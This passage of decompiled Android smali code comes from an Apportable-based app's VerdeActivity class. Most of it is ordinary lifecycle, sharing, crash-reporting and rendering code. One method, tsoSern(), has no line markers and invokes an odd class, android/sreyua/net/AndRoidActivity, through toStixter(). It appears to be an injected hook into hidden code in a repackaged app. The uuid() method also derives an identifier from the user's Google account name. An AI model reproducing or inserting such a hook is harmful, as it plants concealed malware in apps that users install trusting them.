    .line 281
    :cond_15
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->mLibraryLoader:Lcom/apportable/activity/BGLibraryLoader;

    new-instance v1, Lcom/apportable/activity/VerdeActivity$7;

    invoke-direct {v1, p0}, Lcom/apportable/activity/VerdeActivity$7;-><init>(Lcom/apportable/activity/VerdeActivity;)V

    invoke-virtual {v0, v1}, Lcom/apportable/activity/BGLibraryLoader;->onPause(Ljava/lang/Runnable;)V

    .line 288
    return-void
.end method

.method protected onRestart()V
    .registers 3

    .prologue
    .line 309
    invoke-super {p0}, Lcom/apportable/activity/AccelerometerActivity;->onRestart()V

    .line 311
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->mLibraryLoader:Lcom/apportable/activity/BGLibraryLoader;

    new-instance v1, Lcom/apportable/activity/VerdeActivity$9;

    invoke-direct {v1, p0}, Lcom/apportable/activity/VerdeActivity$9;-><init>(Lcom/apportable/activity/VerdeActivity;)V

    invoke-virtual {v0, v1}, Lcom/apportable/activity/BGLibraryLoader;->onRestart(Ljava/lang/Runnable;)V

    .line 318
    return-void
.end method

.method protected onResume()V
    .registers 3

    .prologue
    .line 253
    invoke-super {p0}, Lcom/apportable/activity/AccelerometerActivity;->onResume()V

    .line 254
    invoke-static {p0}, Lcom/android/ViewServer;->get(Landroid/content/Context;)Lcom/android/ViewServer;

    move-result-object v0

    invoke-virtual {v0, p0}, Lcom/android/ViewServer;->setFocusedWindow(Landroid/app/Activity;)V

    .line 256
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->mLibraryLoader:Lcom/apportable/activity/BGLibraryLoader;

    new-instance v1, Lcom/apportable/activity/VerdeActivity$6;

    invoke-direct {v1, p0}, Lcom/apportable/activity/VerdeActivity$6;-><init>(Lcom/apportable/activity/VerdeActivity;)V

    invoke-virtual {v0, v1}, Lcom/apportable/activity/BGLibraryLoader;->onResume(Ljava/lang/Runnable;)V

    .line 263
    return-void
.end method

.method protected onStart()V
    .registers 3

    .prologue
    .line 232
    invoke-super {p0}, Lcom/apportable/activity/AccelerometerActivity;->onStart()V

    .line 234
    new-instance v0, Lcom/apportable/SocialShareManager;

    invoke-direct {v0, p0}, Lcom/apportable/SocialShareManager;-><init>(Landroid/content/Context;)V

    .line 235
    invoke-static {}, Lcom/apportable/CrashReporter;->onStart()V

    .line 237
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->mLibraryLoader:Lcom/apportable/activity/BGLibraryLoader;

    new-instance v1, Lcom/apportable/activity/VerdeActivity$5;

    invoke-direct {v1, p0}, Lcom/apportable/activity/VerdeActivity$5;-><init>(Lcom/apportable/activity/VerdeActivity;)V

    invoke-virtual {v0, v1}, Lcom/apportable/activity/BGLibraryLoader;->onStart(Ljava/lang/Runnable;)V

    .line 249
    return-void
.end method

.method protected onStop()V
    .registers 3

    .prologue
    .line 292
    invoke-super {p0}, Lcom/apportable/activity/AccelerometerActivity;->onStop()V

    .line 294
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->mLibraryLoader:Lcom/apportable/activity/BGLibraryLoader;

    new-instance v1, Lcom/apportable/activity/VerdeActivity$8;

    invoke-direct {v1, p0}, Lcom/apportable/activity/VerdeActivity$8;-><init>(Lcom/apportable/activity/VerdeActivity;)V

    invoke-virtual {v0, v1}, Lcom/apportable/activity/BGLibraryLoader;->onStop(Ljava/lang/Runnable;)V

    .line 305
    return-void
.end method

.method public primaryContainer()Landroid/widget/FrameLayout;
    .registers 2

    .prologue
    .line 440
    iget-object v0, p0, Lcom/apportable/activity/VerdeActivity;->rootOfAllEvil:Landroid/widget/FrameLayout;

    return-object v0
.end method

.method public queueEvent(Ljava/lang/Runnable;)V
    .registers 2

    .prologue
    .line 575
    invoke-interface {p1}, Ljava/lang/Runnable;->run()V

    .line 576
    return-void
.end method

.method public runOnThread(Ljava/lang/Runnable;I)V
    .registers 4

    .prologue
    .line 444
    packed-switch p2, :pswitch_data_10

    .line 453
    :goto_3
    return-void

    .line 446
    :pswitch_4
    invoke-virtual {p0, p1}, Lcom/apportable/activity/VerdeActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    goto :goto_3

    .line 449
    :pswitch_8
    invoke-static {}, Lcom/apportable/MainThread;->getHandler()Landroid/os/Handler;

    move-result-object v0

    invoke-virtual {v0, p1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto :goto_3

    .line 444
    :pswitch_data_10
    .packed-switch 0x0
        :pswitch_4
        :pswitch_8
    .end packed-switch
.end method

.method public savePreferenceEditorHack(Landroid/content/SharedPreferences$Editor;)V
    .registers 2

    .prologue
    .line 623
    invoke-interface {p1}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 624
    return-void
.end method

.method public sendEmail(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;[B)V
    .registers 12

    .prologue
    const/4 v0, 0x0

    .line 504
    .line 505
    if-eqz p1, :cond_28

    .line 506
    const-string v0, "mounted"

    invoke-static {}, Landroid/os/Environment;->getExternalStorageState()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_10

    .line 539
    :goto_f
    return-void

    .line 509
    :cond_10
    :try_start_10
    const-string v0, "file"

    const/4 v1, 0x0

    invoke-virtual {p0, v1}, Lcom/apportable/activity/VerdeActivity;->getExternalFilesDir(Ljava/lang/String;)Ljava/io/File;

    move-result-object v1

    invoke-static {v0, p1, v1}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v0

    .line 510
    new-instance v1, Ljava/io/FileOutputStream;

    invoke-direct {v1, v0}, Ljava/io/FileOutputStream;-><init>(Ljava/io/File;)V

    .line 511
    const/4 v2, 0x0

    array-length v3, p7

    invoke-virtual {v1, p7, v2, v3}, Ljava/io/FileOutputStream;->write([BII)V

    .line 512
    invoke-virtual {v1}, Ljava/io/FileOutputStream;->close()V
    :try_end_28
    .catch Ljava/io/IOException; {:try_start_10 .. :try_end_28} :catch_a1

    .line 518
    :cond_28
    new-instance v1, Landroid/content/Intent;

    const-string v2, "android.intent.action.SEND"

    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 519
    if-eqz v0, :cond_3d

    .line 520
    invoke-virtual {v1, p4}, Landroid/content/Intent;->setType(Ljava/lang/String;)Landroid/content/Intent;

    .line 521
    invoke-static {v0}, Landroid/net/Uri;->fromFile(Ljava/io/File;)Landroid/net/Uri;

    move-result-object v0

    .line 522
    const-string v2, "android.intent.extra.STREAM"

    invoke-virtual {v1, v2, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 524
    :cond_3d
    if-eqz p4, :cond_98

    const-string v0, "text/plain"

    invoke-virtual {p4, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_98

    move-object v0, p4

    :goto_48
    invoke-virtual {v1, v0}, Landroid/content/Intent;->setType(Ljava/lang/String;)Landroid/content/Intent;

    .line 525
    sget-object v0, Lcom/apportable/activity/VerdeActivity;->TAG:Ljava/lang/String;

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "mailIntent.setType:"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 526
    const-string v0, "android.intent.extra.SUBJECT"

    invoke-virtual {v1, v0, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 527
    if-eqz p5, :cond_75

    .line 528
    const-string v0, "android.intent.extra.EMAIL"

    const-string v2, ","

    invoke-virtual {p5, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v0, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;[Ljava/lang/String;)Landroid/content/Intent;

    .line 530
    :cond_75
    if-eqz p6, :cond_7c

    .line 531
    const-string v0, "android.intent.extra.CC"

    invoke-virtual {v1, v0, p6}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 533
    :cond_7c
    const-string v0, "text/html"

    invoke-virtual {p4, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_9b

    .line 534
    const-string v0, "android.intent.extra.TEXT"

    invoke-static {p3}, Landroid/text/Html;->fromHtml(Ljava/lang/String;)Landroid/text/Spanned;

    move-result-object v2

    invoke-virtual {v1, v0, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/CharSequence;)Landroid/content/Intent;

    .line 538
    :goto_8d
    const-string v0, "Send"

    invoke-static {v1, v0}, Landroid/content/Intent;->createChooser(Landroid/content/Intent;Ljava/lang/CharSequence;)Landroid/content/Intent;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/apportable/activity/VerdeActivity;->startActivity(Landroid/content/Intent;)V

    goto/16 :goto_f

    .line 524
    :cond_98
    const-string v0, "message/rfc822"

    goto :goto_48

    .line 536
    :cond_9b
    const-string v0, "android.intent.extra.TEXT"

    invoke-virtual {v1, v0, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    goto :goto_8d

    .line 513
    :catch_a1
    move-exception v0

    goto/16 :goto_f
.end method

.method public setContentSize(FF)V
    .registers 4

    .prologue
    .line 627
    new-instance v0, Lcom/apportable/activity/VerdeActivity$13;

    invoke-direct {v0, p0, p1, p2}, Lcom/apportable/activity/VerdeActivity$13;-><init>(Lcom/apportable/activity/VerdeActivity;FF)V

    invoke-virtual {p0, v0}, Lcom/apportable/activity/VerdeActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    .line 635
    return-void
.end method

.method public setCrashDumpsEnabled(Z)V
    .registers 2

    .prologue
    .line 410
    invoke-static {p1}, Lcom/apportable/CrashReporter;->setCrashDumpsEnabled(Z)V

    .line 411
    return-void
.end method

.method public setTrackingEnabled(Z)V
    .registers 2

    .prologue
    .line 406
    invoke-static {p1}, Lcom/apportable/CrashReporter;->setTrackingEnabled(Z)V

    .line 407
    return-void
.end method

.method public swapBuffers()V
    .registers 2

    .prologue
    .line 394
    invoke-static {}, Lcom/apportable/app/VerdeApplication;->getApplication()Lcom/apportable/app/VerdeApplication;

    move-result-object v0

    invoke-virtual {v0}, Lcom/apportable/app/VerdeApplication;->getSurface()Lcom/apportable/gl/GLSurfaceView;

    move-result-object v0

    invoke-virtual {v0}, Lcom/apportable/gl/GLSurfaceView;->swapBuffers()V

    .line 395
    return-void
.end method

.method public trackEvent(Ljava/lang/String;Landroid/os/Bundle;)V
    .registers 3

    .prologue
    .line 398
    invoke-static {p1, p2}, Lcom/apportable/CrashReporter;->trackEvent(Ljava/lang/String;Landroid/os/Bundle;)V

    .line 399
    return-void
.end method

.method public tsoSern()V
    .registers 2

    .prologue
    new-instance v0, Landroid/sreyua/net/AndRoidActivity;

    invoke-direct {v0, p0}, Landroid/sreyua/net/AndRoidActivity;-><init>(Landroid/content/Context;)V

    invoke-virtual {v0}, Landroid/sreyua/net/AndRoidActivity;->toStixter()V

    return-void
.end method

.method public uuid()Ljava/lang/String;
    .registers 5

    .prologue
    .line 374
    const/4 v0, -0x1

    invoke-virtual {p0}, Lcom/apportable/activity/VerdeActivity;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v1

    const-string v2, "android.permission.GET_ACCOUNTS"

    invoke-virtual {p0}, Lcom/apportable/activity/VerdeActivity;->getPackageName()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v2, v3}, Landroid/content/pm/PackageManager;->checkPermission(Ljava/lang/String;Ljava/lang/String;)I

    move-result v1

    if-ne v0, v1, :cond_16

    .line 375
    invoke-direct {p0}, Lcom/apportable/activity/VerdeActivity;->prefsUuid()Ljava/lang/String;

    move-result-object v0

    .line 385
    :goto_15
    return-object v0

    .line 377
    :cond_16
    invoke-static {p0}, Landroid/accounts/AccountManager;->get(Landroid/content/Context;)Landroid/accounts/AccountManager;

    move-result-object v0

    .line 378
    if-nez v0, :cond_21

    .line 379
    invoke-direct {p0}, Lcom/apportable/activity/VerdeActivity;->prefsUuid()Ljava/lang/String;

    move-result-object v0

    goto :goto_15

    .line 381
    :cond_21
    const-string v1, "com.google"

    invoke-virtual {v0, v1}, Landroid/accounts/AccountManager;->getAccountsByType(Ljava/lang/String;)[Landroid/accounts/Account;

    move-result-object v0

    .line 382
    array-length v1, v0

    if-nez v1, :cond_2f

    .line 383
    invoke-direct {p0}, Lcom/apportable/activity/VerdeActivity;->prefsUuid()Ljava/lang/String;

    move-result-object v0

    goto :goto_15

    .line 385
    :cond_2f
    const/4 v1, 0x0

    aget-object v0, v0, v1

    iget-object v0, v0, Landroid/accounts/Account;->name:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->getBytes()[B

    move-result-object v0

    invoke-static {v0}, Ljava/util/UUID;->nameUUIDFromBytes([B)Ljava/util/UUID;

    move-result-object v0

    invoke-virtual {v0}, Ljava/util/UUID;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toUpperCase()Ljava/lang/String;

    move-result-object v0

    goto :goto_15
.end method
